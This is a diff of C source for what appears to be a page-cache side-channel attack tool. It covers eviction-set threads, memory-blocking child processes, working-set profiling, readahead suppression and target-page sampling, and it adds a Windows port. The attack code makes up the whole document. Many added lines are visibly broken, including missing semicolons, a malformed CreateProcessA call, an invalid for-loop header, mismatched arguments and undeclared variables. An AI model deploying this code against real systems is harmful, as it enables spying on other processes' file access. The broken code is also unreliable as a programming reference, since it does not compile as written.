@@ -57,44 +57,97 @@ static size_t TOTAL_RAM_BYTES = 0;
 
 static int running = 0;
 static int eviction_running = 0;
+#ifdef _WIN32
+    static char attack_exec_path[OSAL_MAX_PATH_LEN] = {0};
+#endif
 
+
+/*-----------------------------------------------------------------------------
+ * FUNCTION PROTOTYPES
+ */
+static void initTargetFile(TargetFile *target_file) 
+static void closeTargetFile(void *arg); 
+static void initFillUpProcess(FillUpProcess *fp);
+static void closeFillUpProcess(void *arg);
+static void initCachedFile(CachedFile *cached_file);
+static void closeCachedFile(void *arg);
+static void closeCachedFileArrayFreeOnly(void *arg);
+static void closeThread(void *arg);
+static int initAttackEvictionSet(AttackEvictionSet *es);
+static void closeAttackEvictionSet(AttackEvictionSet *es);
+static int initAttackBlockingSet(AttackBlockingSet *bs);
+static void closeAttackBlockingSet(AttackBlockingSet *bs);
+static int initAttackWorkingSet(AttackWorkingSet *ws);
+static void closeAttackWorkingSet(AttackWorkingSet *ws);
+static int initAttackSuppressSet(AttackSuppressSet *ss);
+static void closeAttackSuppressSet(AttackSuppressSet *ss);
+static void initPageAccessThreadESData(PageAccessThreadESData *ps_access_thread_es_data);
+static void closePageAccessThreadESData(void *arg);
+static void initPageAccessThreadWSData(PageAccessThreadWSData *ps_access_thread_ws_data);
+static void closePageAccessThreadWSData(void *arg);
+static int initAttack(Attack *attack);
+static void freeAttack(Attack *attack);
+
+static int createEvictionSet(Attack *attack);
+static size_t evictTargets(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *target_evicted_arg_ptr);
+static size_t evictTargets_(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr);
+static size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, void *target_evicted_arg_ptr);
+static int spawnESThreads(Attack *attack);
+static void *pageAccessThreadES(void *arg);
+static size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void *targets_evicted_arg_ptr, 
+    size_t access_offset, size_t access_len);
+
+static void *bsManagerThread(void *arg);
+static size_t parseAvailableMem(AttackBlockingSet *bs);
+static int blockRAM(AttackBlockingSet *bs, size_t fillup_size);
+#ifdef _WIN32
+static int blockRAMChildWindows(AttackBlockingSet *bs);
+#endif
+static void releaseRAMCb(void *addr, void *arg);
+static void releaseRAM(AttackBlockingSet *bs, size_t release_size);
+
+static int profileAttackWorkingSet(Attack *attack);
+#ifdef _WIN32
+static int profileAttackWorkingSetFolder(Attack *attack, char *folder);
+#endif
+static int initialProfileResidentPagesFile(Attack *attack, char *file_path); 
+static void targetFileCacheStatusMaskReadahead(TargetFile *target_file, FileMapping *target_file_mapping, 
+    size_t ra_window_size_pages);
+static int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold);
+static int pageSeqCmp(void *node, void *data);
+static size_t activateWS(ListNode *resident_files_start, size_t resident_files_count, int use_file_api);
+static void *wsManagerThread(void *arg);
+static void *pageAccessThreadWS(void *arg);
+static int reevaluateWorkingSet(AttackWorkingSet *ws);
+static int reevaluateWorkingSetList(List *cached_file_list, AttackWorkingSet *ws);
+
+static int spawnSuppressThreads(Attack *attack)
+static void *suppressThread(void *arg);
+
+static size_t getMappingCount(const unsigned char *status, size_t size_in_pages);
 
 /*-----------------------------------------------------------------------------
  * HELPER FUNCTIONS FOR CUSTOM DATATYPES
  */
-void initCachedFile(CachedFile *cached_file)
+void initTargetFile(TargetFile *target_file) 
 {
-    memset(cached_file, 0, sizeof(CachedFile));
-    initFileMapping(&cached_file->mapping_);
-    // do not waste memory at initialization
-    // can not fail because no memory is reserved
-    dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), 0);
+    initFileMapping(&target_file->mapping_);
+    // can not fail, initial size is 0
+    dynArrayInit(&target_file->target_pages_, sizeof(TargetPage), 0);
 }
 
-
-void closeCachedFile(void *arg)
+void closeTargetFile(void *arg) 
 {
-    CachedFile *cached_file = arg;
-
-    closeFileMapping(&cached_file->mapping_);
-    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
+    TargetFile *target_file = arg;
+    closeFileMapping(&target_file->mapping_);
+    dynArrayDestroy(&target_file->target_pages_, NULL);
 }
-
-
-void closeCachedFileArrayFreeOnly(void *arg)
-{
-    CachedFile *cached_file = arg;
-
-    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
-}
-
 
 void initFillUpProcess(FillUpProcess *fp)
 {
     memset(fp, 0, sizeof(FillUpProcess));
     fp->pid_ = -1;
 }
-
 
 void closeFillUpProcess(void *arg)
 {
@@ -108,6 +161,29 @@ void closeFillUpProcess(void *arg)
     fp->pid_ = 0;
 }
 
+void initCachedFile(CachedFile *cached_file)
+{
+    memset(cached_file, 0, sizeof(CachedFile));
+    initFileMapping(&cached_file->mapping_);
+    // do not waste memory at initialization
+    // can not fail because no memory is reserved
+    dynArrayInit(&cached_file->resident_page_sequences_, sizeof(PageSequence), 0);
+}
+
+void closeCachedFile(void *arg)
+{
+    CachedFile *cached_file = arg;
+
+    closeFileMapping(&cached_file->mapping_);
+    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
+}
+
+void closeCachedFileArrayFreeOnly(void *arg)
+{
+    CachedFile *cached_file = arg;
+
+    dynArrayDestroy(&cached_file->resident_page_sequences_, NULL);
+}
 
 void closeThread(void *arg)
 {
@@ -115,7 +191,6 @@ void closeThread(void *arg)
 
     pthread_join(*thread, NULL);
 }
-
 
 int initAttackEvictionSet(AttackEvictionSet *es)
 {
@@ -138,50 +213,13 @@ int initAttackEvictionSet(AttackEvictionSet *es)
     return 0;
 }
 
-
 void closeAttackEvictionSet(AttackEvictionSet *es)
 {
-    // only used if ES_USE_THREADS is defined
     dynArrayDestroy(&es->access_threads_, closePageAccessThreadESData);
     sem_destroy(&es->worker_start_sem_);
     sem_destroy(&es->worker_join_sem_);
-    //-------------------------------------------------------------------------
-     closeFileMapping(&(es->mapping_));
+    closeFileMapping(&(es->mapping_));
 }
-
-
-int initAttackWorkingSet(AttackWorkingSet *ws)
-{
-    memset(ws, 0, sizeof(AttackWorkingSet));
-    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), PCA_ARRAY_INIT_CAP))
-    {
-        return -1;
-    }
-    for(size_t i = 0; i < 2; i++)
-    {
-        listInit(&ws->resident_files_[i], sizeof(CachedFile));
-        listInit(&ws->non_resident_files_[i], sizeof(CachedFile));
-    }
-    if(pthread_rwlock_init(&ws->ws_lists_lock_, NULL) != 0) 
-    {
-        return -1;
-    }
-
-    return 0;
-}
-
-
-void closeAttackWorkingSet(AttackWorkingSet *ws)
-{
-    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
-    for(size_t i = 0; i < 2; i++)
-    {
-        listDestroy(&ws->resident_files_[i], closeCachedFile);
-        listDestroy(&ws->non_resident_files_[i], closeCachedFile);
-    }
-    pthread_rw_lock_destroy(&ws->ws_lists_lock_);
-}
-
 
 int initAttackBlockingSet(AttackBlockingSet *bs)
 {
@@ -205,6 +243,36 @@ void closeAttackBlockingSet(AttackBlockingSet *bs)
     sem_destroy(&bs->initialized_sem_);
 }
 
+int initAttackWorkingSet(AttackWorkingSet *ws)
+{
+    memset(ws, 0, sizeof(AttackWorkingSet));
+    if (!dynArrayInit(&ws->access_threads_, sizeof(PageAccessThreadWSData), PCA_ARRAY_INIT_CAP))
+    {
+        return -1;
+    }
+    for(size_t i = 0; i < 2; i++)
+    {
+        listInit(&ws->resident_files_[i], sizeof(CachedFile));
+        listInit(&ws->non_resident_files_[i], sizeof(CachedFile));
+    }
+    if(pthread_rwlock_init(&ws->ws_lists_lock_, NULL) != 0) 
+    {
+        return -1;
+    }
+
+    return 0;
+}
+
+void closeAttackWorkingSet(AttackWorkingSet *ws)
+{
+    dynArrayDestroy(&ws->access_threads_, closePageAccessThreadWSData);
+    for(size_t i = 0; i < 2; i++)
+    {
+        listDestroy(&ws->resident_files_[i], closeCachedFile);
+        listDestroy(&ws->non_resident_files_[i], closeCachedFile);
+    }
+    pthread_rw_lock_destroy(&ws->ws_lists_lock_);
+}
 
 int initAttackSuppressSet(AttackSuppressSet *ss)
 {
@@ -217,18 +285,15 @@ int initAttackSuppressSet(AttackSuppressSet *ss)
     return 0;
 }
 
-
 void closeAttackSuppressSet(AttackSuppressSet *ss)
 {
     dynArrayDestroy(&ss->target_readahead_window_, NULL);
 }
 
-
 void initPageAccessThreadESData(PageAccessThreadESData *page_access_thread_es_data)
 {
     memset(page_access_thread_es_data, 0, sizeof(PageAccessThreadESData));
 }
-
 
 void closePageAccessThreadESData(void *arg)
 {
@@ -238,12 +303,10 @@ void closePageAccessThreadESData(void *arg)
     pthread_join(page_access_thread_es_data->tid_, NULL);
 }
 
-
 void initPageAccessThreadWSData(PageAccessThreadWSData *page_access_thread_ws_data)
 {
     memset(page_access_thread_ws_data, 0, sizeof(PageAccessThreadWSData));
 }
-
 
 void closePageAccessThreadWSData(void *arg)
 {
@@ -255,23 +318,6 @@ void closePageAccessThreadWSData(void *arg)
         pthread_join(page_access_thread_ws_data->tid_, NULL);
     }
 }
-
-
-void initTargetFile(TargetFile *target_file) 
-{
-    initFileMapping(&target_file->mapping_);
-    // can not fail, initial size is 0
-    dynArrayInit(&target_file->target_pages_, sizeof(TargetPage), 0);
-}
-
-
-void closeTargetFile(void *arg) 
-{
-    TargetFile *target_file = arg;
-    closeFileMapping(&target_file->mapping_);
-    dynArrayDestroy(&target_file->target_pages_, NULL);
-}
-
 
 int initAttack(Attack *attack)
 {
@@ -311,7 +357,6 @@ int initAttack(Attack *attack)
 
     return 0;
 }
-
 
 void freeAttack(Attack *attack)
 {
@@ -379,6 +424,23 @@ int pcaStart(Attack *attack, int flags)
 {
     int ret = 0;
 
+    // only windows
+    // special handling of blocking and working set
+#ifdef _WIN32
+    if(flags & PCA_START_WIN_SPAWN_BS_CHILD)
+    {
+        if(blockRAMChildWindows() != 0)
+        {
+            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at blockRAMChildWindows...\n", OSAL_EC));
+            return -1;
+        }
+    }
+    if(flags & PCA_START_WIN_SPAWN_WS_CHILD)
+    {
+
+    }
+#endif
+
     // profile system working set if wanted
     // done before any memory is blocked so that the whole current working set can be profiled
     if (attack->use_attack_ws_)
@@ -390,7 +452,7 @@ int pcaStart(Attack *attack, int flags)
             goto error;
         }
         // TODO move to main
-        //printf(INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
+        //DEBUG_PRINT((DEBUG INFO "%zu files with %zu mapped bytes of sequences bigger than %zu pages are currently resident in memory.\n",
         //       attack->working_set_.resident_files_.count_, attack->working_set_.mem_in_ws_, attack->working_set_.ps_add_threshold_);
     }
 
@@ -413,7 +475,7 @@ int pcaStart(Attack *attack, int flags)
         }
     }
 
-    // TODO
+    // TODO !
     // if wanted spawn readahead suppress threads
     if(attack->use_attack_ss_)
     {
@@ -437,6 +499,7 @@ int pcaStart(Attack *attack, int flags)
         if (pthread_create(&attack->bs_manager_thread_, NULL, bsManagerThread, &attack->blocking_set_) != 0)
         {
             DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at pthread_create...\n", OSAL_EC));
+            goto error;
         }
         else
         {
@@ -445,6 +508,13 @@ int pcaStart(Attack *attack, int flags)
         }
     }
 
+#ifdef _WIN32
+    if(GetModuleFileNameA(NULL, attack_exec_path, OSAL_MAX_PATH_LEN) == 0)
+    {
+        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at GetModuleFileNameA...\n", OSAL_EC)); 
+        goto error;
+    }
+#endif
     // TODO
     // profile working set
     // start all threads and so on
@@ -616,13 +686,6 @@ cleanup:
     return ret;
 }
 
-// teardown
-void pcaExit(Attack *attack)
-{
-    // TODO stop running threads
-    exitAttack(attack);
-}
-
 // for single page hit tracing
 int pcaTargetPagesSampleFlushOnce(Attack *attack) 
 {
@@ -688,6 +751,15 @@ int pcaTargetFileRangeSampleFlushOnce(Attack *attack, TargetFile *target_file)
         return -1;
     }
     return 0;
+}
+
+// teardown
+void pcaExit(Attack *attack)
+{
+    // signal that attack execution should stop
+    __atomic_store_n(&running, 0, __ATOMIC_RELAXED);
+    // stop attack execution
+    exitAttack(attack);
 }
 
 
@@ -986,7 +1058,7 @@ size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, 
         // in case of error skip
         if (sem_post(&attack->eviction_set_.worker_start_sem_) != 0)
         {
-            DEBUG_PRINT((DEBUG WARNING "Error (%s) at sem_post...\n", strerror(errno)));
+            DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
             continue;
         }
     }
@@ -997,7 +1069,7 @@ size_t evictTargetsThreads_(Attack *attack, TargetsEvictedFn target_evicted_fn, 
         // in case of error skip
         if (sem_wait(&attack->eviction_set_.worker_join_sem_) != 0)
         {
-            DEBUG_PRINT((DEBUG WARNING "Error (%s) at sem_wait...\n", strerror(errno)));
+            DEBUG_PRINT((DEBUG WARNING "Error " OSAL_EC_FS " at sem_wait...\n", OSAL_EC));
             continue;
         }
 
@@ -1021,7 +1093,7 @@ int spawnESThreads(Attack *attack)
     //  reserve space for access thread data structures
     if (dynArrayResize(&attack->eviction_set_.access_threads_, attack->eviction_set_.access_thread_count_) == NULL)
     {
-        printf(FAIL "Could not reserve memory...\n");
+        DEBUG_PRINT((DEBUG FAIL "Could not reserve memory...\n");
         goto error;
     }
 
@@ -1052,7 +1124,7 @@ int spawnESThreads(Attack *attack)
         PageAccessThreadESData *thread_data = dynArrayGet(&attack->eviction_set_.access_threads_, t);
         if (pthread_create(&thread_data->tid_, NULL, pageAccessThreadES, thread_data) != 0)
         {
-            printf(FAIL "Error (%s) at creating ES access thread...\n", strerror(errno));
+            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at creating ES access thread...\n", OSAL_EC));
             goto error;
         }
     }
@@ -1078,7 +1150,7 @@ void *pageAccessThreadES(void *arg)
     {
         if (sem_wait(thread_data->start_sem_) != 0)
         {
-            DEBUG_PRINT((DEBUG ES_THREAD_TAG "Error (%s) at sem_wait (%p)...\n", strerror(errno), (void *)page_thread_data->start_sem_));
+            DEBUG_PRINT((DEBUG ES_THREAD_TAG "Error " OSAL_EC_FS " at sem_wait (%p)...\n", OSAL_EC, (void *)page_thread_data->start_sem_));
             goto error;
         }
 
@@ -1089,7 +1161,7 @@ void *pageAccessThreadES(void *arg)
 
         if (sem_post(thread_data->join_sem_) != 0)
         {
-            printf(FAIL ES_THREAD_TAG "Error (%s) at sem_post (%p)...\n", strerror(errno), (void *)thread_data->join_sem_);
+            DEBUG_PRINT((DEBUG FAIL ES_THREAD_TAG "Error " OSAL_EC_FS " at sem_post (%p)...\n", OSAL_EC, (void *)thread_data->join_sem_);
             goto error;
         }
     }
@@ -1119,6 +1191,14 @@ size_t evictTargets__(Attack *attack, TargetsEvictedFn targets_evicted_fn, void 
                 attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_, 
                 attack->working_set_.access_use_file_api_);
             pthread_rwlock_unlock(&ws->ws_lists_lock_);
+        }
+
+        // access ss
+        if (accessed_mem % attack->suppress_set_.ss_access_all_x_bytes_ == 0)
+        {
+            activateSS(&attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_], 
+                attack->working_set_.resident_files_[attack->working_set_.up_to_date_list_set_].count_, 
+                attack->working_set_.access_use_file_api_);
         }
 
         // prefetch larger blocks (more efficient IO)
@@ -1306,13 +1386,14 @@ size_t parseAvailableMem(AttackBlockingSet *bs)
 }
 #endif
 
+#ifdef __linux
 int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
 {
     int ret = 0;
     FillUpProcess child_process;
     void *fillup_mem = NULL;
-    sem_t *sem = MAP_FAILED;
     size_t needed_childs = 0;
+    sem_t *sem = NULL;
 
     // init child structure
     initFillUpProcess(&child_process);
@@ -1322,12 +1403,12 @@ int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
     sem = mmap(NULL, sizeof(sem_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
     if (sem == MAP_FAILED)
     {
-        DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error (%s) at mmap...\n", strerror(errno)));
+        DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at mmap...\n", OSAL_EC));
         goto error;
     }
     if (sem_init(sem, 1, 0))
     {
-        DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error (%s) at sem_init...\n", strerror(errno));
+        DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_init...\n", OSAL_EC));
         goto error;
     }
 
@@ -1340,7 +1421,7 @@ int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
         if (child_process.pid_  < 0)
         {
             // parent
-            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error (%s) at fork for block ram child..\n", strerror(errno)));
+            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at fork for block ram child..\n", OSAL_EC));
             goto error;
         }
         else if (child_process.pid_ == 0)
@@ -1356,10 +1437,10 @@ int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
             {
                 if (sem_post(sem) != 0)
                 {
-                    printf(FAIL BS_MGR_TAG "Error (%s) at sem_post...\n", strerror(errno));
+                    DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
                 }
 
-                printf(FAIL BS_MGR_TAG "Error (%s) mmap..\n", strerror(errno));
+                DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " mmap..\n", OSAL_EC));
                 exit(-1);
             }
 
@@ -1372,7 +1453,7 @@ int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
             // finished
             if (sem_post(sem) != 0)
             {
-                printf(FAIL BS_MGR_TAG "Error (%s) at sem_post...\n", strerror(errno));
+                DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_post...\n", OSAL_EC));
                 exit(-1);
             }
 
@@ -1387,18 +1468,18 @@ int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
         // wait until child process has finished
         if (sem_wait(sem))
         {
-            printf(FAIL BS_MGR_TAG "Error (%s) at sem_wait...\n", strerror(errno));
+            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at sem_wait...\n", OSAL_EC));
             goto error;
         }
 
         // error at dynArrayAppend <=> child could not be added
         if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
         {
-            printf(FAIL BS_MGR_TAG "Error (%s) at dynArrayAppend...\n", strerror(errno));
+            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
             goto error;
         }
     }
-    printf(INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024);
+    DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024));
 
     goto cleanup;
 error:
@@ -1418,6 +1499,145 @@ cleanup:
 
     return ret;
 }
+#elif defined(_WIN32)
+int blockRAM(AttackBlockingSet *bs, size_t fillup_size)
+{
+    int ret = 0;
+    FillUpProcess child_process;
+    void *fillup_mem = NULL;
+    size_t needed_childs = 0;
+    HANDLE sem = NULL;
+    STARTUPINFO startup_info;
+    PROCESS_INFORMATION process_info;
+
+    // init child structure
+    initFillUpProcess(&child_process);
+    child_process.fillup_size_ = bs->def_fillup_size_;
+
+    // prepare structures for process creation
+    memset(&startup_info, 0, sizeof(startup_info));
+    startup_info.cb = sizeof(startup_info);
+    memset(&process_info, 0, sizeof(process_info));
+
+    // create a inter-process semaphore
+    sem = CreateSemaphoreA(NULL, 0, 1, PCA_WINDOWS_BS_SEMAPHORE_NAME);
+    if(sem  == NULL)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at CreateSemaphoreA\n", OSAL_EC));
+        goto error;
+    }
+
+    // round down
+    needed_childs = fillup_size / bs->def_fillup_size_;
+    for (size_t i = 1; i <= needed_childs; i++)
+    {
+        // create fill up child process
+        child_process.pid_ = CreateProcessA(module_path, PCA_WINDOWS_BS_COMMANDLINE, NULL, NULL, FALSE, CREATE_NO_WINDOW,
+            NULL, NULL, &startup_info, &process_info))
+        {
+            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at CreateProcessA\n", OSAL_EC));
+            goto error;
+        }
+
+        // parent
+        // wait until child process has finished
+        if(WaitForSingleObject(sem, INFINITE) == WAIT_FAILED)
+        {
+            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at WaitForSingleObject\n", OSAL_EC));
+            goto error;
+        }
+
+        // error at dynArrayAppend <=> child could not be added
+        if (!dynArrayAppend(&bs->fillup_processes_, &child_process))
+        {
+            DEBUG_PRINT((DEBUG FAIL BS_MGR_TAG "Error " OSAL_EC_FS " at dynArrayAppend...\n", OSAL_EC));
+            goto error;
+        }
+    }
+    DEBUG_PRINT((DEBUG INFO BS_MGR_TAG "Blocked %zu kB...\n", needed_childs * bs->def_fillup_size_ / 1024));
+
+    goto cleanup;
+error:
+    ret = -1;
+    // kill rouge child if existing
+    if(child_process.pid_ > 0)
+    {
+        osal_process_kill(child_process.pid_);
+    }
+
+cleanup:
+    if(sem != NULL)
+    {
+        CloseHandle(sem);
+    }
+
+    return ret;
+}
+
+int blockRAMChildWindows(AttackBlockingSet *bs) 
+{
+    HANDLE sem = NULL;
+
+    DEBUG_PRINT((DEBUG INFO "New child with %zu MB dirty memory spawned...\n", bs->def_fillup_size_ / 1024 / 1024));
+
+    // open shared semaphore
+    sem = OpenSemaphoreA(SYNCHRONIZE | SEMAPHORE_MODIFY_STATE, FALSE, PCA_WINDOWS_BS_SEMAPHORE_NAME);
+    if(sem == NULL)
+    {
+        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at OpenSemaphoreA\n", OSAL_EC));
+        goto error;
+    }
+  
+    // allocate memory
+    dirty_mem = VirtualAlloc(NULL, bs->def_fillup_size_, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if(dirty_mem == NULL)
+    {
+        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at VirtualAlloc\n", OSAL_EC));
+        goto error;
+    }
+    
+    // dirty memory with random content (no deduplication, compression)
+    for(size_t offset = 0; offset < bs->def_fillup_size_; offset += PAGE_SIZE)
+    {
+        if(BCryptGenRandom(NULL, (BYTE *) dirty_mem + offset, PAGE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
+        {
+            DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at BCryptGenRandom\n", OSAL_EC));
+            goto error;
+        }
+    }
+    // possibly missing random bytes (if size not multiple of PAGE_SIZE)
+    size_t missing_random = bs->def_fillup_size_ % PAGE_SIZE;
+    if(missing_random != 0 &&
+        BCryptGenRandom(NULL, (BYTE *) dirty_mem + bs->def_fillup_size_ - missing_random, missing_random, 
+            BCRYPT_USE_SYSTEM_PREFERRED_RNG) != STATUS_SUCCESS)
+    {
+        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at BCryptGenRandom\n", OSAL_EC));
+        goto error;
+    }
+  
+    // signal that memory blocking was successful to parent process
+    if(!ReleaseSemaphore(sem, 1, NULL))
+    {
+        DEBUG_PRINT((DEBUG FAIL "Error " OSAL_EC_FS " at ReleaseSemaphore\n", OSAL_EC));
+        goto error;
+    }
+
+    // sleep forever
+    Sleep(INFINITE);
+
+error:
+    if(sem != NULL)
+    {
+        CloseHandle(sem);
+    }
+    if(dirty_mem != NULL)
+    {
+        VirtualFree(dirty_mem, 0, MEM_RELEASE);
+    }
+
+    return -1;
+}
+#endif
 
 void releaseRAMCb(void *addr, void *arg)
 {
@@ -1447,6 +1667,122 @@ void releaseRAM(AttackBlockingSet *bs, size_t release_size)
 /*-----------------------------------------------------------------------------
  * FUNCTIONS RELATED TO ATTACK WORKING SET
  */
+
+#ifdef __linux
+int profileAttackWorkingSet(Attack *attack)
+{
+    int ret = 0;
+    FTS *fts_handle = NULL;
+    FTSENT *current_ftsent = NULL;
+
+    // use fts to traverse over all files in the searchpath
+    fts_handle = fts_open(attack->working_set_.search_paths_, FTS_PHYSICAL, NULL);
+    if (fts_handle == NULL)
+    {
+        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_open...\n", OSAL_EC));
+        return -1;
+    }
+
+    while (running)
+    {
+        current_ftsent = fts_read(fts_handle);
+        // error at traversing files
+        if (current_ftsent == NULL && errno)
+        {
+            // catch too many open files error (end gracefully)
+            if (errno == EMFILE)
+            {
+                DEBUG_PRINT((DEBUG "Too many open files at fts_read, ignoring rest of files...\n"));
+                break;
+            }
+
+            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_read...\n", OSAL_EC));
+            goto error;
+        }
+        // end
+        else if (current_ftsent == NULL)
+        {
+            break;
+        }
+
+        // regular file
+        if (current_ftsent->fts_info == FTS_F)
+        {
+            // if failed for one file ignore and just try the next one
+           initialProfileResidentPagesFile(attack, current_ftsent->fts_path);
+        }
+    }
+
+    goto cleanup;
+error:
+    ret = -1;
+    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);
+
+cleanup:
+    fts_close(fts_handle);
+
+    return ret;
+}
+#elif defined (_WIN32)
+int profileAttackWorkingSet(Attack *attack)
+{
+    int ret = 0;
+
+    for(size_t i < 0; attack->working_set_.search_paths_[i] != NULL && running; i++) 
+    {
+        if(profileAttackWorkingSetFolder(attack, attack->working_set_.search_paths_[i], inactive_list_set) != 0)
+        {
+            goto error;
+        }
+    }
+    
+    return 0;
+
+error:
+    ret = -1;
+    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);
+    return ret;
+}
+
+int profileAttackWorkingSetFolder(Attack *attack, char *folder)
+{
+    char *full_pattern[OSAL_MAX_PATH_LEN];
+    WIN32_FIND_DATA find_file_data;
+    HANDLE handle;
+
+    // go through all files and subdirectories
+    PathCombineA(full_pattern, folder, "*");
+    handle = FindFirstFileA(full_pattern, &find_file_data);
+    if(handle == INVALID_HANDLE_VALUE)
+    {
+        if(GetLastError() == ERROR_FILE_NOT_FOUND)
+        {
+            return 0;
+        }
+
+        return -1;
+    }
+
+    do
+    {
+        PathCombineA(full_pattern, folder, find_file_data.cFileName);
+        if(find_file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+        {
+            if(profileAttackWorkingSetFolder(attack, full_pattern, pattern) != 0) 
+            {
+               return -1; 
+            }
+        }
+        else 
+        {
+            initialProfileResidentPagesFile(attack, full_pattern);                
+        }
+    } while(FindNextFile(handle, &find_file_data));
+    
+    FindClose(handle);
+    return 0;
+}
+#endif
 
 int initialProfileResidentPagesFile(Attack *attack, char *file_path) 
 {
@@ -1533,7 +1869,6 @@ error:
     return -1;
 }
 
-
 void targetFileCacheStatusMaskReadahead(TargetFile *target_file, FileMapping *target_file_mapping, size_t ra_window_size_pages) 
 {
     size_t back_ra_trigger_window = ra_window_size_pages / 2 - 1;
@@ -1559,9 +1894,6 @@ void targetFileCacheStatusMaskReadahead(TargetFile *target_file, FileMapping *ta
             target_file_mapping->pages_cache_status_[p] = 0;
     }
 }
-
- 
-
 
 int profileResidentPageSequences(CachedFile *current_cached_file, size_t ps_add_threshold)
 {
@@ -1630,7 +1962,6 @@ error:
     current_cached_file->resident_memory_ = 0;
 }
 
-
 int pageSeqCmp(void *node, void *data)
 {
     if (((PageSequence *)data)->length_ > ((PageSequence *)node)->length_)
@@ -1640,124 +1971,6 @@ int pageSeqCmp(void *node, void *data)
 
     return 0;
 }
-
-
-#ifdef __linux
-int profileAttackWorkingSet(Attack *attack)
-{
-    int ret = 0;
-    FTS *fts_handle = NULL;
-    FTSENT *current_ftsent = NULL;
-
-    // use fts to traverse over all files in the searchpath
-    fts_handle = fts_open(attack->working_set_.search_paths_, FTS_PHYSICAL, NULL);
-    if (fts_handle == NULL)
-    {
-        DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_open...\n", OSAL_EC));
-        return -1;
-    }
-
-    while (running)
-    {
-        current_ftsent = fts_read(fts_handle);
-        // error at traversing files
-        if (current_ftsent == NULL && errno)
-        {
-            // catch too many open files error (end gracefully)
-            if (errno == EMFILE)
-            {
-                DEBUG_PRINT((DEBUG "Too many open files at fts_read, ignoring rest of files...\n"));
-                break;
-            }
-
-            DEBUG_PRINT((DEBUG "Error " OSAL_EC_FS " at fts_read...\n", OSAL_EC));
-            goto error;
-        }
-        // end
-        else if (current_ftsent == NULL)
-        {
-            break;
-        }
-
-        // regular file
-        if (current_ftsent->fts_info == FTS_F)
-        {
-            // if failed for one file ignore and just try the next one
-           initialProfileResidentPagesFile(attack, current_ftsent->fts_path);
-        }
-    }
-
-    goto cleanup;
-error:
-    ret = -1;
-    listDestroy(&attack->working_set_.resident_files_, closeCachedFile);
-
-cleanup:
-    fts_close(fts_handle);
-
-    return ret;
-}
-#elif defined (_WIN32)
-static int profileAttackWorkingSetFolder(Attack *attack, char *folder)
-{
-    char *full_pattern[OSAL_MAX_PATH_LEN];
-    WIN32_FIND_DATA find_file_data;
-    HANDLE handle;
-
-    // go through all files and subdirectories
-    PathCombineA(full_pattern, folder, "*");
-    handle = FindFirstFileA(full_pattern, &find_file_data);
-    if(handle == INVALID_HANDLE_VALUE)
-    {
-        if(GetLastError() == ERROR_FILE_NOT_FOUND)
-        {
-            return 0;
-        }
-
-        return -1;
-    }
